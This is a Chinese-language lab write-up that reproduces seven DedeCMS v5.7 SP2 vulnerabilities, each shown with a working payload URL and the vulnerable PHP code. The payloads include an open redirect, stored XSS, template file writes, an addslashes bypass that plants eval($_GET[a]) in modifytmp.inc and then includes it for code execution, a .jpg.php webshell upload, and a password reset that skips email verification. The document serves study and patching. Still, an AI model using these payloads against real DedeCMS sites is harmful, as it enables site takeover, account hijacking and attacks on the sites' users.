## DedeCMS_v5.7漏洞复现

### 环境搭建：

服务器：WinServer2008（10.10.10.143） + phpstudy2018

DedeCMS版本：DedeCMS-V5.7-UTF8-SP2

下载地址：https://pan.baidu.com/s/1GQjWSDe7IlMVsVJ7HvrBOw  提取码: i4wk



### 0x01 URL重定向

版本<=5.7sp2

#### 漏洞复现

payload：

```
http://10.10.10.143/Dedecms/plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20=
```

![](https://s2.loli.net/2022/04/05/nSQBAZ8x5pUhHqj.png)

url重定向到百度：

![](https://s2.loli.net/2022/04/05/w4tregVHW7msAoQ.png)

#### 漏洞分析

Dedecms/plus/download.php:55

<img src="https://s2.loli.net/2022/04/05/ju9NbPwU1fi6WmH.png"  />

```php
$id = isset($id) && is_numeric($id) ? $id : 0;
$link = base64_decode(urldecode($link));
```

代码中首先对\$link进行url解码（浏览器自动对\$link进行url编码），

再对其进行base64解码，所以在URL重定向复现时，要将URL进行base64编码

![](https://s2.loli.net/2022/04/05/ouxRkPJ15cmdbZF.png)

### 0x02 后台shops_delivery_存储型XSS

#### 漏洞复现

管理员在添加用户购买商品的配送方式时，可能会触发x存储型ss

模拟管理员添加配送方式：

进入后台--->会员--->配货方式设置--->增加一个配货方式

![](https://s2.loli.net/2022/04/03/zY5gmKr4ZJtCxUD.png)

上图中最后一个方式是由笔者自己添加的xss测试代码

用户在购买商品时会自动弹出配送方式列表

![](https://s2.loli.net/2022/04/03/WqcnRUeSPKzvByT.png)

#### 漏洞分析

漏洞触发点在如下文件中：

Dedecms/dede/shops_delivery.php:28

```php
$des = cn_substrR($des,255);
    $InQuery = "INSERT INTO #@__shops_delivery(`dname`,`price`,`des`) VALUES ('$dname','$price','$des');";
    $result = $dsql->ExecuteNoneQuery($InQuery);
    if($result)
    {
        ShowMsg("成功添加一个配送方式!","shops_delivery.php");
    }
    else
    {
        ShowMsg("添加配送方式时发生SQL错误!","-1");
    }
    exit();
```

代码中对配货方式（des）没有做任何过滤便添加到数据库中

<br>

### 0x03 carbuyaction_存储型XSS

### 漏洞复现

用户在编辑订单信息（填写收货地址）处可以插入xss代码

管理员在查看用户订单信息时会触发xss漏洞：

![](https://s2.loli.net/2022/04/03/a31BtsDeXfNHCxI.png)

### 漏洞分析

Dedecms/plus/carbuyaction.php:111

```php
$address     = cn_substrR(trim($address),200);
```

程序中没有对address参数进行过滤

### 0x04 tpl后台文件写入

版本=5.7sp2、5.81

#### 漏洞复现

token获取：

访问http://10.10.10.143/Dedecms/dede/index.php

源代码里有token

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220405111040.png)



构造payload:

```
http://10.10.10.143/Dedecms/dede/tpl.php?action=savetagfile&filename=123.lib.php&acontent=<?php phpinfo();?>&token=871dcbfab72289fce2c0544f3d78f7a1
```

执行结果如下：

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220405111254.png)

创建的文件路径：

http://10.10.10.143/Dedecms/include/taglib/123.lib.php

访问如下：

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220405111756.png)

文件成功被写入

#### 漏洞分析

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220405101543.png)

\$action=savetagfile时可以将文件保存为.lib.php格式的脚本

其中\$content为文件的内容，\$filewname为文件名

正则表达式要求文件名中至少包含一个字母、数字、"\_"、"\-"

所以测试如下参数：

```action=savetagfile```

```content=<?php phpinfo(); ?>```

```filename=123.lib.php```

253行有一个csrf检测，因此在漏洞利用的时候需要传入一个token参数



### 0x05 sys_verifies后台文件写入

版本：5.7sp1、5.7sp2

#### 漏洞复现

payload

```
http://10.10.10.143/Dedecms/dede/sys_verifies.php?action=getfiles&refiles[]=123&refiles[]=\";phpinfo();die();//
```



![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220405164310.png)

写入文件：Dedecms/data/modifytmp.inc



#### 漏洞分析&GetShell

sys_verifies.php:152

```php
else if ($action == 'getfiles')
{
    if(!isset($refiles))
    {
        ShowMsg("你没进行任何操作！","sys_verifies.php");
        exit();
    }
    $cacheFiles = DEDEDATA.'/modifytmp.inc';
    $fp = fopen($cacheFiles, 'w');
    fwrite($fp, '<'.'?php'."\r\n");
    fwrite($fp, '$tmpdir = "'.$tmpdir.'";'."\r\n");
    $dirs = array();
    $i = -1;
    $adminDir = preg_replace("#(.*)[\/\\\\]#", "", dirname(__FILE__));      # 获取当前文件的绝对目录
    foreach($refiles as $filename)
    {
        $filename = substr($filename,3,strlen($filename)-3);        # 去掉$filename中的前三个字符
        if(preg_match("#^dede/#i", $filename)) 
        {
            $curdir = GetDirName( preg_replace("#^dede/#i", $adminDir.'/', $filename) );        #去掉$filename中的DEDE(dede)制度
        } else {
            $curdir = GetDirName($filename);
        }
        if( !isset($dirs[$curdir]) ) 
        {
            $dirs[$curdir] = TestIsFileDir($curdir);
        }
        $i++;
        fwrite($fp, '$files['.$i.'] = "'.$filename.'";'."\r\n");
    }
    fwrite($fp, '$fileConut = '.$i.';'."\r\n");
    fwrite($fp, '?'.'>');
    fclose($fp);
```

上述代码中要求传入参数

\$action=getfiles

\$refiles是一个数组，数组中的内容将会被写入到\$cacheFiles也就是DEDEDATA.'/modifytmp.inc‘文件中，(其中DEDEDATA为data文件夹的路径)，并且\\$refiles的内容是可控的

我们首先尝试传入测试字符串：

payload_test1

```
http://10.10.10.143/Dedecms/dede/sys_verifies.php?action=getfiles&refiles[]=hummer
```



![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220405170604.png)

前三个字母被删除了，因为源代码中有如下操作：

```php
$filename = substr($filename,3,strlen($filename)-3);        # 去掉$filename中的前三个字符
```

我们尝试写入自己的命令：

```php
http://10.10.10.143/Dedecms/dede/sys_verifies.php?action=getfiles&refiles[]=123"phpinfo(); die(); //
```

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220405204456.png)

发现单引号和双引号都被转义了，因为Ddedecms在common.inc.php中对代码进行了全局addslash()过滤，会将双引号，单引号，斜杠前都加上一个斜杠

这里有个非常有意思的东西，我们输入的内容前三个字符会被删除掉，如果我们只输入```/"```,过滤后就会变成```///"```,程序恰好会帮助我们删除三个斜杠，这样就能成功过滤addslash函数了。

再次尝试修改我们的payload

```php
http://10.10.10.143/Dedecms/dede/sys_verifies.php?action=getfiles&refiles[]=\";phpinfo(); die(); //
```

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220405204613.png)

成功写入！！

此文件在\$action=down的部分还存在文件包含漏洞

我们向modifytmp.inc中写入测试代码：

```php
http://10.10.10.143/Dedecms/dede/sys_verifies.php?action=getfiles&refiles[]=\";eval($_GET[a]); die(); //
```



![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220405191545.png)

上图代码中存在文件包含漏洞，尝试利用

```
http://10.10.10.143/Dedecms/dede/sys_verifies.php?action=down&a=echo 'hummer';
```

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220405205404.png)

测试成功！！



### 0x06 album_add_后台文件上传

#### 漏洞复现：

制作图片马，内容为

```php
<?php phpinfo(); ?>
```

命名为123.jpg.php，压缩为zip文件

打开网址：http://10.10.10.143/Dedecms/dede/album_add.php

选择从zip压缩包上传

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220406092031.png)

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220406092103.png)

点击确定上传

上传完成后点击预览文档

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220406092158.png)

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220406092954.png)

漏洞复现成功！！

图片上传的位置为：```Dedecms\uploads\allimg```

上传的图片在后台内容管理->图片集中也可以进行管理

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220406093330.png)

#### 漏洞分析

查看源代码：

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220406094858.png)

对上传文件的限制是```.jpg```、```.png```、```.gif```

没有对文件名做更多的过滤，我们只要上传shell.jpg.php即可



### 0x07 前台任意密码重置

#### 漏洞复现

创建账号hummer(mid=2)模仿攻击者账号，创建test(mid=4)模仿被攻击者

登录hummer账号

payload:

```
10.10.10.143/Dedecms/member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id=4
```

burpsuite抓服务器的响应：

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220406161751.png)

可以看到服务器为我们返回了```key=swHO1E2V```

访问：http://10.10.10.143/Dedecms/member/resetpassword.php?dopost=getpasswd&id=4&key=swHO1E2V

就可以修改密码了



#### 漏洞分析

漏洞出现的文件：Dedecms/member/resetpassword.php:75

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220406170452.png)

```php
if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer)
{
    sn($mid, $row['userid'], $row['email'], 'N');
    exit();
}
```

如果safequestion和safeanswer都匹配正确，则进入sn()函数

我们继续跟踪sn()

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220406170814.png)

```php
if(!is_array($row))
    {
        //发送新邮件；
        newmail($mid,$userid,$mailto,'INSERT',$send);
    }
```



直接进入newmail()函数，继续跟踪：

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220406171420.png)

```php
elseif($send == 'N')
            {
                return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&amp;id=".$mid."&amp;key=".$randval);
            }
```



默认的```$send```参数为N，所以会直跳转给出\$key，不需要邮箱验证

得到\$key以后，传入dopost=getpasswd,并传入key值和用户id即可成功修改密码

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220406171734.png)

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220406171706.png)



